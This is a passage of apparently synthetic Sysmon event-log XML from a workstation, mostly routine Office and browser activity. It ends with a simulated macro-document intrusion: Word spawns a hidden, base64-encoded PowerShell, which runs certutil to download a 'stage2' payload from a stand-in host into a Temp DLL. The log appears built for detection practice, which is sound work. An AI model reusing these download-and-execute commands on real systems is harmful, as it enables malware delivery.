SystemTime=\"2026-11-08T08:33:44.5040000Z\"/><EventRecordID>52003</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 08:33:44.504</Data><Data Name=\"ProcessId\">7504</Data><Data Name=\"Image\">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"QueryName\">mail.example.org</Data><Data Name=\"QueryStatus\">0</Data><Data Name=\"QueryResults\">::ffff:192.0.2.25;</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T08:46:22.9780000Z\"/><EventRecordID>52004</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 08:46:22.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">49914</Data><Data Name=\"DestinationIp\">192.0.2.10</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T08:58:45.9780000Z\"/><EventRecordID>52005</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 08:58:45.978</Data><Data Name=\"ProcessId\">7504</Data><Data Name=\"Image\">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">65354</Data><Data Name=\"DestinationIp\">192.0.2.25</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T09:10:12.8120000Z\"/><EventRecordID>52006</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 09:10:12.812</Data><Data Name=\"ProcessId\">1499</Data><Data Name=\"Image\">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">&quot;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&quot; /n &quot;C:\\Users\\mmartin\\Documents\\budget_2027.docx&quot;</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">6005</Data><Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T09:21:47.9780000Z\"/><EventRecordID>52007</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 09:21:47.978</Data><Data Name=\"ProcessId\">7504</Data><Data Name=\"Image\">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">60373</Data><Data Name=\"DestinationIp\">192.0.2.25</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T09:36:09.9780000Z\"/><EventRecordID>52008</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 09:36:09.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">52272</Data><Data Name=\"DestinationIp\">192.0.2.10</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T09:40:02.0580000Z\"/><EventRecordID>52009</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 09:40:02.058</Data><Data Name=\"ProcessId\">7217</Data><Data Name=\"Image\">C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">&quot;C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE&quot; &quot;C:\\Users\\mmartin\\Documents\\rapprochement_bancaire.xlsx&quot;</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">6005</Data><Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>13</EventID><TimeCreated SystemTime=\"2026-11-08T09:40:03.1330000Z\"/><EventRecordID>52010</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 09:40:03.133</Data><Data Name=\"ProcessId\">6005</Data><Data Name=\"Image\">C:\\Windows\\explorer.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"EventType\">SetValue</Data><Data Name=\"TargetObject\">HKU\\S-1-5-21-3623811015-3361044348-30300820-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.xlsx\\MRUListEx</Data><Data Name=\"Details\">Binary Data</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T09:48:43.9780000Z\"/><EventRecordID>52011</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 09:48:43.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">65372</Data><Data Name=\"DestinationIp\">192.0.2.11</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T09:52:30.3960000Z\"/><EventRecordID>52012</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 09:52:30.396</Data><Data Name=\"ProcessId\">3378</Data><Data Name=\"Image\">C:\\Windows\\splwow64.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">C:\\Windows\\splwow64.exe 12288</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">1499</Data><Data Name=\"ParentImage\">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T10:00:01.4730000Z\"/><EventRecordID>52013</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 10:00:01.473</Data><Data Name=\"ProcessId\">5970</Data><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"User\">NT AUTHORITY\\SYSTEM</Data><Data Name=\"CommandLine\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventaire.ps1</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">System</Data><Data Name=\"ParentProcessId\">1236</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\svchost.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T10:09:04.9780000Z\"/><EventRecordID>52014</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 10:09:04.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">56744</Data><Data Name=\"DestinationIp\">192.0.2.11</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T10:15:20.0360000Z\"/><EventRecordID>52015</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 10:15:20.036</Data><Data Name=\"ProcessId\">9797</Data><Data Name=\"Image\">C:\\Windows\\System32\\certutil.exe</Data><Data Name=\"User\">CORP\\it-admin</Data><Data Name=\"CommandLine\">C:\\Windows\\System32\\certutil.exe -hashfile C:\\Users\\it-admin\\Downloads\\setup.msi SHA256</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">High</Data><Data Name=\"ParentProcessId\">1996</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T10:22:06.9780000Z\"/><EventRecordID>52016</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 10:22:06.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">61918</Data><Data Name=\"DestinationIp\">192.0.2.11</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T10:34:19.9780000Z\"/><EventRecordID>52017</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 10:34:19.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">59969</Data><Data Name=\"DestinationIp\">192.0.2.11</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>11</EventID><TimeCreated SystemTime=\"2026-11-08T10:48:07.5370000Z\"/><EventRecordID>52018</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 10:48:07.537</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"TargetFilename\">C:\\Users\\mmartin\\Downloads\\releve_octobre.pdf</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T10:56:15.9780000Z\"/><EventRecordID>52019</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 10:56:15.978</Data><Data Name=\"ProcessId\">7504</Data><Data Name=\"Image\">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">56159</Data><Data Name=\"DestinationIp\">192.0.2.25</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>10</EventID><TimeCreated SystemTime=\"2026-11-08T11:02:40.0430000Z\"/><EventRecordID>52020</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 11:02:40.043</Data><Data Name=\"SourceProcessId\">5482</Data><Data Name=\"SourceImage\">C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe</Data><Data Name=\"TargetProcessId\">8086</Data><Data Name=\"TargetImage\">C:\\Windows\\System32\\lsass.exe</Data><Data Name=\"GrantedAccess\">0x1410</Data><Data Name=\"SourceUser\">NT AUTHORITY\\SYSTEM</Data><Data Name=\"TargetUser\">NT AUTHORITY\\SYSTEM</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T11:03:56.9780000Z\"/><EventRecordID>52021</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 11:03:56.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">49323</Data><Data Name=\"DestinationIp\">192.0.2.10</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>10</EventID><TimeCreated SystemTime=\"2026-11-08T11:20:15.0930000Z\"/><EventRecordID>52022</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 11:20:15.093</Data><Data Name=\"SourceProcessId\">4114</Data><Data Name=\"SourceImage\">C:\\Windows\\System32\\Taskmgr.exe</Data><Data Name=\"TargetProcessId\">8086</Data><Data Name=\"TargetImage\">C:\\Windows\\System32\\lsass.exe</Data><Data Name=\"GrantedAccess\">0x1000</Data><Data Name=\"SourceUser\">CORP\\mmartin</Data><Data Name=\"TargetUser\">NT AUTHORITY\\SYSTEM</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T11:25:19.9780000Z\"/><EventRecordID>52023</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 11:25:19.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">58563</Data><Data Name=\"DestinationIp\">192.0.2.11</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T11:37:00.9780000Z\"/><EventRecordID>52024</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 11:37:00.978</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">54141</Data><Data Name=\"DestinationIp\">192.0.2.11</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">443</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>11</EventID><TimeCreated SystemTime=\"2026-11-08T14:02:11.6520000Z\"/><EventRecordID>52025</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:02:11.652</Data><Data Name=\"ProcessId\">4378</Data><Data Name=\"Image\">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"TargetFilename\">C:\\Users\\mmartin\\Downloads\\facture_2026-118.docm</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T14:05:10.7620000Z\"/><EventRecordID>52026</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:05:10.762</Data><Data Name=\"ProcessId\">1499</Data><Data Name=\"Image\">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">&quot;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&quot; /n &quot;C:\\Users\\mmartin\\Downloads\\facture_2026-118.docm&quot;</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">6005</Data><Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T14:05:31.6780000Z\"/><EventRecordID>52027</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:05:31.678</Data><Data Name=\"ProcessId\">5970</Data><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">powershell.exe -nop -w hidden -enc IwAgAG0AaQBuAGkALQBTAEkARQBNACAAOgAgAGQAbwBuAG4AZQBlAHMAIABzAHkAbgB0AGgAZQB0AGkAcQB1AGUAcwAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABjAGUAcgB0AHUAdABpAGwALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnAC0AdQByAGwAYwBhAGMAaABlACAALQBzAHAAbABpAHQAIAAtAGYAIABoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4AMgAwADAALwBzAHQAYQBnAGUAMgAuAHQAeAB0ACAAJQBUAEUATQBQACUAXAB1AHAAZAAuAGQAbABsACcA</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">1499</Data><Data Name=\"ParentImage\">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>22</EventID><TimeCreated SystemTime=\"2026-11-08T14:05:48.3370000Z\"/><EventRecordID>52028</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:05:48.337</Data><Data Name=\"ProcessId\">5970</Data><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"QueryName\">cdn-update.example.net</Data><Data Name=\"QueryStatus\">0</Data><Data Name=\"QueryResults\">::ffff:203.0.113.200;</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>1</EventID><TimeCreated SystemTime=\"2026-11-08T14:05:49.9920000Z\"/><EventRecordID>52029</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:05:49.992</Data><Data Name=\"ProcessId\">9797</Data><Data Name=\"Image\">C:\\Windows\\System32\\certutil.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"CommandLine\">certutil.exe -urlcache -split -f http://203.0.113.200/stage2.txt C:\\Users\\mmartin\\AppData\\Local\\Temp\\upd.dll</Data><Data Name=\"CurrentDirectory\">C:\\Users\\mmartin\\</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"ParentProcessId\">5970</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>3</EventID><TimeCreated SystemTime=\"2026-11-08T14:05:50.2510000Z\"/><EventRecordID>52030</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>PC-COMPTA01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-11-08 14:05:50.251</Data><Data Name=\"ProcessId\">9797</Data><Data Name=\"Image\">C:\\Windows\\System32\\certutil.exe</Data><Data Name=\"User\">CORP\\mmartin</Data><Data Name=\"Protocol\">tcp</Data><Data Name=\"Initiated\">true</Data><Data Name=\"SourceIp\">10.0.20.15</Data><Data Name=\"SourcePort\">54895</Data><Data Name=\"DestinationIp\">203.0.113.200</Data><Data Name=\"DestinationHostname\"></Data><Data Name=\"DestinationPort\">80</Data></EventData></Event>\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"/><EventID>11</EventID><TimeCreated 